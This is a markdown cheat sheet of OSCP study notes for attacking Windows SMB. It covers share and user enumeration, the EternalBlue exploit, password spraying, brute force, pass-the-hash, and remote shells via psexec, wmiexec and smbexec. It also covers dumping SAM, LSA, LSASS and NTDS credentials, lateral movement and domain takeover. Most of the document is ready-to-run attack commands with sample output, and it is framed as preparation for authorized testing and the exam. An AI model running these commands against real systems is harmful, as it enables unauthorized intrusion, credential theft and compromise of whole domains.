# SMB — Complete OSCP Notes
> **Scope**: Authorized penetration testing and OSCP exam preparation only.

---

## Table of Contents
1. [SMB Basics](#smb-basics)
2. [Ports & Versions](#ports--versions)
3. [Enumeration](#enumeration)
4. [Anonymous & Null Session](#anonymous--null-session)
5. [Exploitation](#exploitation)
6. [Pass-the-Hash](#pass-the-hash)
7. [Getting a Shell](#getting-a-shell)
8. [Post Exploitation](#post-exploitation)
9. [secretsdump.py](#secretsdumppy)
10. [Quick Cheat Sheet](#quick-cheat-sheet)

---

## SMB Basics

**SMB (Server Message Block)** is a network file-sharing protocol used by Windows to share files, printers, and other resources across a network.

**Why SMB is attacked:**
- Uses NTLM authentication (hash-based) — hashes can be captured and relayed
- Older versions (SMBv1) have critical unpatched vulnerabilities
- Misconfigurations allow anonymous/null session access
- Hash reuse across machines is extremely common in AD environments

**NTLM Authentication Flow:**
```
Client → Server: "I want access" (Negotiate)
Server → Client: "Here is a challenge (random number)"
Client → Server: Hash(password + challenge) = Response
Server: Verifies response → Grants access
```
The hash sent over the network can be **captured** and either **cracked offline** or **relayed** to another machine.

---

## Ports & Versions

| Port | Protocol | Usage |
|------|----------|-------|
| **139** | NetBIOS over TCP | Legacy SMB (Win 95/98 era) |
| **445** | Direct SMB over TCP | Modern SMB (Win 2000+) |

| Version | OS | Security | Attacker Notes |
|---------|-----|----------|----------------|
| **SMBv1** | XP, Server 2003 | Very Weak | EternalBlue (MS17-010) — direct SYSTEM shell |
| **SMBv2** | Vista, Server 2008 | Moderate | Relay attacks work |
| **SMBv3** | Win 8, Server 2012+ | Stronger | Relay still possible if signing disabled |

> **Rule**: Always check SMBv1 first — if present, try EternalBlue before anything else.

---

## Enumeration

### Step 1 — Nmap

```bash
# Basic SMB port scan
nmap -p 139,445 192.168.1.0/24

# Version + default scripts
nmap -p 139,445 -sV -sC 192.168.1.10

# All SMB vulnerability scripts
nmap -p 445 --script smb-vuln* 192.168.1.10

# EternalBlue check (MS17-010)
nmap -p 445 --script smb-vuln-ms17-010 192.168.1.10

# OS discovery
nmap -p 445 --script smb-os-discovery 192.168.1.10

# Users + shares
nmap -p 445 --script smb-enum-shares,smb-enum-users 192.168.1.10

# SMB signing check
nmap -p 445 --script smb2-security-mode 192.168.1.10
```

**EternalBlue Vulnerable Output:**
```
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 (ms17-010)
|     State: VULNERABLE
|     IDs: CVE:CVE-2017-0143
```

**SMB Signing Output:**
```
| smb2-security-mode:
|   3.1.1:
|_  Message signing enabled but not required   ← RELAY POSSIBLE
```

---

### Step 2 — CrackMapExec

```bash
# Full network overview (most important first command)
crackmapexec smb 192.168.1.0/24

# Anonymous/Guest check
crackmapexec smb 192.168.1.10 -u '' -p ''
crackmapexec smb 192.168.1.10 -u 'guest' -p ''

# Credential validation
crackmapexec smb 192.168.1.10 -u administrator -p Password123

# Share enumeration
crackmapexec smb 192.168.1.10 -u john -p Password123 --shares

# Password spray (many users, one password)
crackmapexec smb 192.168.1.0/24 -u users.txt -p 'Password123' --continue-on-success

# Execute command
crackmapexec smb 192.168.1.10 -u administrator -p Password123 -x "whoami"

# Generate relay targets list (signing:False only)
crackmapexec smb 192.168.1.0/24 --gen-relay-list targets.txt
```

**Key output fields:**
```
SMB  192.168.1.10  WIN10-PC  (domain:TECHCORP) (signing:False) (SMBv1:True)
                              ↑ AD environment  ↑ Relay OK     ↑ EternalBlue
```
- `signing:False` → SMB Relay attack possible
- `signing:True` → SMB Relay will fail
- `domain = machine name` → Standalone machine
- `domain = company name` → Active Directory environment
- `(Pwn3d!)` → Admin access confirmed

---

### Step 3 — smbclient

```bash
# List all shares (anonymous)
smbclient -L //192.168.1.10 -N

# List shares with credentials
smbclient -L //192.168.1.10 -U 'administrator%Password123'

# Connect to share (anonymous)
smbclient //192.168.1.10/SharedFiles -N

# Connect with credentials
smbclient //192.168.1.10/C$ -U 'DOMAIN\john%Password123'
```

**Inside smbclient shell:**
```bash
ls                    # List files
cd Documents          # Change directory
get passwords.txt     # Download file
put shell.exe         # Upload file
mget *.txt            # Download multiple files
recurse ON            # Enable recursive listing
ls                    # Now shows all subdirectories
```

**Shares to investigate:**
| Share | Meaning |
|-------|---------|
| `C$`, `D$` | Full drive — admin only |
| `ADMIN$` | Windows directory — admin only |
| `IPC$` | Inter-process comms — null session test |
| `SYSVOL`, `NETLOGON` | AD shares — check for scripts/passwords |
| Custom shares | Always enumerate these first |

---

### Step 4 — smbmap

```bash
# Anonymous check
smbmap -H 192.168.1.10

# With credentials
smbmap -H 192.168.1.10 -u administrator -p Password123

# Recursive file listing
smbmap -H 192.168.1.10 -R SharedFiles

# Download file
smbmap -H 192.168.1.10 --download 'SharedFiles\passwords.txt'

# Execute command (admin)
smbmap -H 192.168.1.10 -u administrator -p Password123 -x 'whoami'
```

**Output:**
```
Disk           Permissions    Comment
----           -----------    -------
ADMIN$         NO ACCESS
C$             NO ACCESS
IPC$           READ ONLY
SharedFiles    READ, WRITE    ← Write access = possible shell upload!
```

---

### Step 5 — enum4linux

```bash
# Full enumeration
enum4linux -a 192.168.1.10

# Specific modules
enum4linux -U 192.168.1.10    # Users
enum4linux -S 192.168.1.10    # Shares
enum4linux -G 192.168.1.10    # Groups
enum4linux -P 192.168.1.10    # Password policy ← Check lockout!
enum4linux -o 192.168.1.10    # OS info
enum4linux -r 192.168.1.10    # RID brute (user enum)
```

**Critical output — Password Policy:**
```
Minimum password length: 5
Lockout threshold: None   ← No lockout = brute force safe!
```

---

### Step 6 — rpcclient

```bash
# Connect (null session)
rpcclient -U "" -N 192.168.1.10

# Connect with credentials
rpcclient -U "administrator%Password123" 192.168.1.10
```

**Commands inside rpcclient:**
```bash
srvinfo           # Server info
enumdomusers      # List all domain users
enumdomgroups     # List groups
querydominfo      # Domain info
getdompwinfo      # Password policy
queryuser 0x3e8   # User details by RID
```

**User enum output:**
```
user:[Administrator] rid:[0x1f4]
user:[john] rid:[0x3e8]
user:[alice] rid:[0x3e9]
```

---

## Anonymous & Null Session

**Null session** = Connecting to IPC$ with blank username/password.
Older/misconfigured Windows allows enumeration without any credentials.

```bash
# Test null session
smbclient //192.168.1.10/IPC$ -N
rpcclient -U "" -N 192.168.1.10

# CrackMapExec null test
crackmapexec smb 192.168.1.10 -u '' -p '' --shares

# enum4linux uses null session automatically
enum4linux -a 192.168.1.10
```

**Sensitive files to hunt in open shares:**
```
passwords.txt / password.txt
config.ini / web.config
*.xml (especially with credentials)
backup.zip / backup.tar
database.sql
.ssh/id_rsa
SAM / SYSTEM (if someone backed them up!)
Groups.xml (GPP — contains encrypted password, easily cracked)
```

**Download entire share:**
```bash
smbget -R smb://192.168.1.10/PublicShare
```

---

## Exploitation

### EternalBlue — MS17-010 (SMBv1)

**When to use:** nmap shows `smb-vuln-ms17-010: VULNERABLE`

```bash
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.10
set LHOST 192.168.1.100
run
```

**Output:**
```
[*] Meterpreter session 1 opened
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

**Without Metasploit:**
```bash
# Clone exploit
git clone https://github.com/3ndG4me/AutoBlue-MS17-010

# Check vulnerability
python eternal_checker.py 192.168.1.10

# Exploit
python zzz_exploit.py 192.168.1.10
```

---

### Password Spraying

```bash
# One password, many users (safe — avoids lockout)
crackmapexec smb 192.168.1.0/24 -u users.txt -p 'Password123' --continue-on-success
crackmapexec smb 192.168.1.0/24 -u users.txt -p 'Welcome1' --continue-on-success
crackmapexec smb 192.168.1.0/24 -u users.txt -p 'Summer2024!' --continue-on-success

# Common spray passwords
# Password123, Welcome1, Company@123, Season+Year, CompanyName1
```

> Always check lockout policy (enum4linux -P) before spraying.
> If `Lockout threshold: None` → Safe to spray multiple passwords.

---

### Brute Force (only when no lockout)

```bash
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt smb://192.168.1.10
```

---

## Pass-the-Hash

**Concept:** Use the NT hash directly instead of cracking it for the password.
Works because NTLM authentication accepts the hash itself — password never needed.

**NT Hash format (from SAM dump):**
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
                  ↑ LM (useless, always same)        ↑ NT Hash — USE THIS
```

```bash
# psexec PTH
psexec.py -hashes :8846f7eaee8fb117ad06bdd830b7586c administrator@192.168.1.10

# wmiexec PTH
wmiexec.py -hashes :8846f7eaee8fb117ad06bdd830b7586c administrator@192.168.1.10

# CrackMapExec PTH — spray across network
crackmapexec smb 192.168.1.0/24 -u administrator -H :8846f7eaee8fb117ad06bdd830b7586c

# smbclient PTH
smbclient //192.168.1.10/C$ -U administrator --pw-nt-hash 8846f7eaee8fb117ad06bdd830b7586c

# secretsdump PTH
secretsdump.py -hashes :8846f7eaee8fb117ad06bdd830b7586c administrator@192.168.1.10
```

---

## Getting a Shell

### psexec.py — Classic (Noisy)

**How it works:** Uploads a random .exe to ADMIN$ share, creates a service, executes it → SYSTEM shell.

```bash
# Password
psexec.py administrator:Password123@192.168.1.10

# PTH
psexec.py -hashes :NTHASH administrator@192.168.1.10
```

**Result:** `NT AUTHORITY\SYSTEM` shell

---

### wmiexec.py — Recommended (Clean)

**How it works:** Uses WMI — nothing written to disk, memory only.

```bash
psexec.py administrator:Password123@192.168.1.10
wmiexec.py administrator:Password123@192.168.1.10
wmiexec.py -hashes :NTHASH administrator@192.168.1.10
```

---

### smbexec.py — Stealthiest

**How it works:** Uses SMB but avoids disk writes like psexec.

```bash
smbexec.py administrator:Password123@192.168.1.10
smbexec.py -hashes :NTHASH administrator@192.168.1.10
```

---

### Shell Method Decision

```
Try psexec first
    ↓ Fails (AV/detection)
Try wmiexec
    ↓ Fails
Try smbexec
    ↓ Fails
Use CrackMapExec -x for single commands
```

**UAC Note:** Local accounts (non-built-in Administrator) may get `Access Denied` with PTH.
Fix: Use the built-in Administrator account, or set registry key on target:
`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy = 1`

---

## Post Exploitation

### SAM Dump (Local Hashes)

```bash
# Remote (credentials)
secretsdump.py administrator:Password123@192.168.1.10

# Remote (PTH)
secretsdump.py -hashes :NTHASH administrator@192.168.1.10

# CrackMapExec
crackmapexec smb 192.168.1.10 -u administrator -p Password123 --sam
```

### LSA Secrets

```bash
crackmapexec smb 192.168.1.10 -u administrator -p Password123 --lsa
secretsdump.py administrator:Password123@192.168.1.10
# LSA secrets appear automatically in secretsdump output
```

### LSASS (Plaintext/Hashes from Memory)

```bash
# Meterpreter
meterpreter > load kiwi
meterpreter > creds_all

# CrackMapExec module
crackmapexec smb 192.168.1.10 -u administrator -p Password123 -M lsassy
```

### Lateral Movement

```bash
# Take hashes → spray entire network
crackmapexec smb 192.168.1.0/24 -u administrator -H :NTHASH

# Move to next machine
psexec.py -hashes :NTHASH administrator@192.168.1.20

# Check all accessible shares across network
crackmapexec smb 192.168.1.0/24 -u john -p Password123 --shares
```

---

## secretsdump.py

**What it is:** Part of the Impacket suite. Remotely extracts secrets from Windows machines — SAM, LSA, cached credentials, and NTDS.dit (from DC).

**What it dumps:**
| Source | Contains |
|--------|----------|
| SAM | Local user NT hashes |
| LSA Secrets | Service passwords, machine account hash, cached creds |
| NTDS.dit | ALL domain user hashes (DC only) |
| DPAPI | Encrypted stored credentials |

```bash
# Standard remote dump
secretsdump.py administrator:Password123@192.168.1.10

# PTH
secretsdump.py -hashes :NTHASH administrator@192.168.1.10

# Domain Controller — full domain dump
secretsdump.py administrator:Password123@DC_IP

# DC — domain accounts only
secretsdump.py administrator:Password123@DC_IP -just-dc

# DC — NTDS.dit specifically
secretsdump.py administrator:Password123@DC_IP -just-dc-ntds

# Offline (from already-downloaded files)
secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL
```

**Output format:**
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
username      RID  LM Hash (useless)                NT Hash (use this!)
```

**DC dump output:**
```
TECHCORP\Administrator:500:aad3...:8846f7...:::
TECHCORP\krbtgt:502:aad3...:abcdef1234...:::    ← Golden Ticket!
TECHCORP\john:1103:aad3...:2b576acb...:::
TECHCORP\alice:1104:aad3...:9f4c23ab...:::
... (every domain user)
```

**Cracking NT hashes:**
```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

---

## Quick Cheat Sheet

```bash
# ═══ ENUMERATION ═══
nmap -p 445 --script smb-vuln* TARGET
nmap -p 445 --script smb2-security-mode TARGET
crackmapexec smb RANGE
crackmapexec smb TARGET -u '' -p '' --shares
smbmap -H TARGET
smbclient -L //TARGET -N
enum4linux -a TARGET
rpcclient -U "" -N TARGET

# ═══ EXPLOITATION ═══
# EternalBlue (MSF)
use exploit/windows/smb/ms17_010_eternalblue

# Password spray
crackmapexec smb RANGE -u users.txt -p 'Password123' --continue-on-success

# ═══ SHELL ═══
psexec.py user:pass@TARGET
wmiexec.py user:pass@TARGET
smbexec.py user:pass@TARGET
psexec.py -hashes :NTHASH admin@TARGET

# ═══ POST EXPLOITATION ═══
secretsdump.py admin:pass@TARGET
secretsdump.py -hashes :NTHASH admin@TARGET
secretsdump.py admin:pass@DC_IP -just-dc-ntds
crackmapexec smb TARGET -u admin -p pass --sam --lsa

# ═══ PTH ═══
crackmapexec smb RANGE -u admin -H :NTHASH
psexec.py -hashes :NTHASH admin@TARGET
wmiexec.py -hashes :NTHASH admin@TARGET
```

---

## OSCP Attack Decision Tree

```
Port 445 Open?
    ↓
SMBv1 + MS17-010 vulnerable?  → YES → EternalBlue → SYSTEM shell
    ↓ NO
Anonymous/null session?        → YES → Hunt files → credentials?
    ↓
Users enumerated?              → YES → Password spray
    ↓
Credentials valid?             → YES → psexec/wmiexec → shell
    ↓
signing:False anywhere?        → YES → SMB Relay Attack (see File 2)
    ↓
Hashes obtained?               → YES → PTH → lateral movement
```

---

## OSCP Checklist

```
[ ] nmap -p 445 --script smb-vuln* (EternalBlue check)
[ ] crackmapexec smb RANGE (signing, domain, SMBv1)
[ ] Anonymous/null session test
[ ] Share enumeration + file hunting
[ ] User enumeration (enum4linux/rpcclient)
[ ] Password policy check (lockout threshold?)
[ ] Password spraying (common passwords)
[ ] SMB signing check → relay list
[ ] Credential validation across network
[ ] Shell acquisition (psexec/wmiexec)
[ ] SAM/LSA dump (secretsdump)
[ ] Lateral movement (PTH across network)
[ ] DC access → NTDS dump → domain takeover
[ ] Collect proof.txt from all machines
```
